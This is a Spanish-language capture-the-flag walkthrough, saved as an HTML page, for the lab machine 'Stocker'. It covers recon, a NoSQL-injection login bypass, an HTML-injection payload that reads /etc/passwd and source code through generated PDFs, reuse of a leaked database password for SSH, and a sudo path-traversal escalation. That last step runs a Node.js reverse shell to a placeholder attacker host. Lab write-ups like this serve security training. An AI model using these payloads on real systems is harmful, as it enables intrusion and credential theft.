@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Máquina 1</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./stocker.jpg"> <span class="mono authors"> <a href="https://secret.club/author/addison" itemprop="name">Stocker</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Feb, 2023 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+<h2 id="comprobación-del-sistema-operativo">1. Comprobación del sistema operativo</h2>
+<pre><code>python whichSystem.py 10.10.11.196
+</code></pre>
+<p>Tiene como salida:</p>
+<pre class=" language-bash"><code class="prism  language-bash">10.10.11.196 <span class="token punctuation">(</span>ttl -<span class="token operator">&gt;</span> 63<span class="token punctuation">)</span>: Linux
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="comprobamos-servicios-y-lanzamos-scripts-principales-contra-los-principales-puertos">2. Comprobamos servicios y lanzamos scripts principales contra los principales puertos</h2>
+<pre><code>nmap -Pn -sCV -p- 10.10.11.196
+</code></pre>
+<p>Obtenemos lo siguiente:</p>
+<pre><code>Starting Nmap 7.93SVN ( https://nmap.org ) at 2023-02-27 10:18 CET
+Nmap scan report for 10.10.11.196
+Host is up (0.041s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
+|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
+|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://stocker.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.21 seconds
+</code></pre>
+<p>Debemos añadir entonces <strong>stocker.htb</strong> al archivo <code>/etc/hosts</code>.</p>
+<p>&nbsp;</p>
+<h2 id="realizamos-un-fuzzing-web">3. Realizamos un fuzzing web</h2>
+<p>Empezamos realizando un <em>fuzzing</em> de directorio mediante la herramienta <strong>gobuster</strong>, pero no aparece ningún resultado interesante:</p>
+<pre><code>gobuster dir -u http://stocker.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</code></pre>
+<p>Sin embargo, si realizamos un <em>fuzzing</em> de subdominios, podemos observar que aparece el siguiente <code>dev.stocker.htb</code>, por lo que lo añadimos al fichero <code>/etc/hosts</code></p>
+<pre><code>gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="explotación-de-login-de-usuario">4. Explotación de login de usuario</h2>
+<p>Observamos como dicho <em>endpoint</em> se trata de un panel de autenticación. Podemos empezar probando una inyección Sql normal, pero vemos que esto no nos aporta ningún resultado. Si intentamos cambiar el tipo de la petición (<code>content-type</code>) vemos que nos deja establecer el valor <em>application/json</em> por lo que podemos probar inyecciones <strong>nsql</strong>. Para ello podemos hacer uso de <strong>hacktricks</strong> (<a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">https://book.hacktricks.xyz/pentesting-web/nosql-injection</a>), probando por ejemplo con la siguiente, mediante el proxy Burp:</p>
+<pre><code>{"username": {"$ne": null}, "password": {"$ne": null} }
+</code></pre>
+<p>Vemos como si nos deja acceder, y nos redirige al endpoint <code>/stocks</code>.</p>
+<pre><code>HTTP/1.1 302 Found
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 27 Feb 2023 09:53:38 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 56
+Connection: close
+X-Powered-By: Express
+Location: /stock
+Vary: Accept
+
+&lt;p&gt;Found. Redirecting to &lt;a href="/stock"&gt;/stock&lt;/a&gt;&lt;/p&gt;
+</code></pre>
+<p>Si observamos dicha página <code>http://dev.stocker.htbk/stock</code>, podemos observar una especie de carrito de la compra. Este, en el código fuente, realiza la siguiente petición a una api, como se puede ver a continuación:</p>
+<pre><code>const $ = (selector) =&gt; document.querySelector(selector);
+
+const basket = [];
+
+let productStore = [];
+
+const cartModalElement = $("#cart-modal");
+const cartModal = new bootstrap.Modal(cartModalElement);
+
+fetch("/api/products")
+  .then((response) =&gt; response.json())
+  .then((products) =&gt; {
+    productStore = products;
+    const template = $("#product-template");
+
+    products.forEach((product) =&gt; {
+      const clone = template.content.cloneNode(true);
+      const $$ = (selector) =&gt; clone.querySelector(selector);
+
+      $$(".item-title").textContent = product.title;
+      $$(".item-description").textContent = product.description;
+      $$(".item-price").textContent = `£${product.price.toFixed(2)}`;
+      $$(".item-stock").textContent = `${product.currentStock} In Stock`;
+      $$(".item-image").setAttribute("src", `/static/img/${product.image}`);
+      $$(".add-to-basket").setAttribute("product-id", product._id);
+
+      $("#item-container").appendChild(clone);
+    });
+
+    Array.from(document.querySelectorAll(".add-to-basket")).forEach((button) =&gt; {
+      button.addEventListener("click", () =&gt; {
+        const product = productStore.find((product) =&gt; product._id === button.getAttribute("product-id"));
+
+        if (!product) return;
+
+        const existing = basket.find((basketItem) =&gt; basketItem._id === product._id);
+        if (existing) {
+          existing.amount++;
+        } else {
+          basket.push({ ...product, amount: 1 });
+        }
+
+        alert("Added to basket!");
+        console.log(basket);
+      });
+    });
+  });
+
+const beforePurchase = $("#before-purchase");
+const afterPurchase = $("#after-purchase");
+const cartTable = $("#cart-table");
+const submitPurchase = $("#submit-purchase");
+
+const purchaseOrderLink = $("#purchase-order-link");
+
+cartModalElement.addEventListener("show.bs.modal", () =&gt; {
+  beforePurchase.style.display = "";
+  afterPurchase.style.display = "none";
+
+  document.querySelectorAll(".basket-item").forEach((item) =&gt; item.remove());
+
+  const template = $("#basket-template");
+
+  basket.forEach((basketItem) =&gt; {
+    const clone = template.content.cloneNode(true);
+
+    const $$ = (selector) =&gt; clone.querySelector(selector);
+
+    $$(".item-name").textContent = basketItem.title;
+
+    $$(".item-quantity").textContent = basketItem.amount;
+    $$(".item-price").textContent = `£${basketItem.price.toFixed(2)}`;
+
+    cartTable.prepend(clone);
+  });
+
+  $("#cart-total").textContent = basket
+    .map((x) =&gt; x.price * x.amount)
+    .reduce((a, b) =&gt; a + b, 0)
+    .toFixed(2);
+
+  if (basket.length &gt; 0) {
+    submitPurchase.style.display = "";
+  } else {
+    submitPurchase.style.display = "none";
+  }
+});
+
+submitPurchase.addEventListener("click", () =&gt; {
+  fetch("/api/order", {
+    method: "POST",
+    body: JSON.stringify({ basket }),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  })
+    .then((response) =&gt; response.json())
+    .then((response) =&gt; {
+      if (!response.success) return alert("Something went wrong processing your order!");
+
+      purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);
+
+      $("#order-id").textContent = response.orderId;
+
+      beforePurchase.style.display = "none";
+      afterPurchase.style.display = "";
+      submitPurchase.style.display = "none";
+    });
+});
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="añadimos-productos-al-carrito">5. Añadimos productos al carrito</h2>
+<p>Si hacemos una petición GET al recurso <code>/api/products</code> obtenemos como respuesta un listado de productos:</p>
+<pre><code>[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0},{"_id":"638f116eeb060210cbd83a8f","title":"Bin","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0},{"_id":"638f116eeb060210cbd83a91","title":"Axe","description":"It's an axe.","image":"axe.jpg","price":12,"currentStock":21,"__v":0},{"_id":"638f116eeb060210cbd83a93","title":"Toilet Paper","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0}]
+</code></pre>
+<p>Podemos hacer una peticion POST al recurso <code>/api/order</code>, para añadir un producto determinado para tramitar su compra, enivando como contenido de la petición el siguiente:</p>
+<pre><code>{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0}
+</code></pre>
+<p>Si recargamos entonces la página, nos aparecerá un listado de productos listos para comprar. Si seleccionamos uno, lo añadimos a la cesta y lo compramos, veremos que para cada compra se nos genera un archivo pdf con el contenido del json, de la especificación del producto. Si observamos más detenidamente este botón de comprar lo que hace en realidad es una peticion POST al recurso <code>/api/order</code>. Se nos ocurre intentar explotar <code>XSS</code>, para intentar mostrar por ejemplo el archivo <code>/etc/passwd</code>, realizando la siguiente petición:</p>
+<pre><code>POST /api/order HTTP/1.1
+Host: dev.stocker.htb
+Content-Length: 192
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://dev.stocker.htb
+Referer: http://dev.stocker.htb/stock
+Accept-Encoding: gzip, deflate
+Accept-Language: es-ES,es;q=0.9
+Cookie: connect.sid=s%3AG5vhzG6q9xrpsoudvC-yC-WgfEcBzel2.SIkw0RdBGMIlfSaBSOd1zh8y1XcpQ%2BcBa%2Bq%2FiW2s4lk
+Connection: close
+
+{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"&lt;iframe src=/etc/passwd&gt;&lt;/iframe&gt;","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
+</code></pre>
+<p>Y vemos como en la respuesta se imprime el contenido de dicho archivo:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
+landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
+angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="fichero-de-configuración-del-servidor">6. Fichero de configuración del servidor</h2>
+<p>Aprovechando esta vulnerabilidad también podemos ver el fichero de configuración de <em>nginx</em>, situado en la ruta (<code>/etc/nginx/nginx.conf</code>), para ver posibles usuarios o credenciales que estén directamente <em>hardcodeados</em> en el código. Vemos como aquí no hay nada interesante salvo que el fichero de la web <code>dev.stocker.htb</code>se encuentra en la siguiente ruta:</p>
+<pre><code># Virtual Host Configs
+##
+include /etc/nginx/conf.d/*.conf;
+server {
+listen 80;
+root /var/www/dev;
+index index.html index.htm index.nginx-debian.html;
+</code></pre>
+<p>Buscando por internet observamos que el fichero de configuración del servicio <strong>NodeJS</strong> puede tener el nombre de <em>app</em>, <em>main</em> o <em>index.js</em>, por lo que probamos a obtener dicho archivo:</p>
+<pre><code>"&lt;iframe src=file:///var/www/dev/index.js height=1000px width=1000px&gt;&lt;/iframe&gt;"
+</code></pre>
+<p>Obteniendo lo que parecen ser unos credenciales:</p>
+<pre><code>// TODO: Configure loading from dotenv for production
+const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1";
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="obtención-de-una-shell-como-usuario">7. Obtención de una shell como usuario</h2>
+<p>Observando el fichero <code>/etc/passwd</code> capturado en el paso 5, vemos que no existe ningún usuario llamado <strong>dev</strong>. Por lo que vamos probando con los posibles usuarios, resultando ser el usuario <strong>angoose</strong> con la password <code>IHeardPassphrasesArePrettySecure</code>. Pudiendo entonces conectarnos por el servicio <strong>ssh</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="flag-de-usuario">8. Flag de usuario</h2>
+<p>Somos capaces de obtener la flag de usuario -&gt; <em>4d85e98d590478345e259b7552444410</em></p>
+<p>&nbsp;</p>
+<h2 id="escalado-de-privilegios">9. Escalado de privilegios</h2>
+<p>Si ejecutamos <code>sudo -l</code> obtenemos lo siguiente:</p>
+<pre><code>User angoose may run the following commands on stocker:
+(ALL) /usr/bin/node /usr/local/scripts/*.js
+</code></pre>
+<p>Por lo que el usuario <strong>angoose</strong>, puede ejecutar el comando <code>usr/bin/node /usr/local/scripts/*.js</code> con permisos del usuario <strong>root</strong>. Se nos puede ocurrir entonces crear una <em>revershell</em> mediante el lenguaje Javascript en el directorio <code>/usr/local/scripts</code>, introduciendo el siguiente contenido, pero vemos que tiene permisos de administrador:</p>
+<pre><code>(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
+</code></pre>
+<p>Esto puede ser muy fácil de saltar, pues en lugar de ejecutar el comando <code>usr/bin/node /usr/local/scripts/*.js</code> podemos ejecutar algo como <code>/usr/local/scripts/../../../home/angoose/script.js</code>, por lo que podemos establecer el mismo payload que antes. Si lanzamos un netcat en nuestro equipo local, podemos observar como somos capaces de establecer una <em>shell</em> como el usuario <strong>root</strong>.</p>
+<p>&nbsp;</p>
+<h2 id="flag-de-root">10. Flag de root</h2>
+<p>Somos entonces capaces de obtener el flag del usuario <strong>root</strong> -&gt; <em>af0384c294f9e8a52d8ca14415973bbb</em></p>
+
+
+
+
+
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
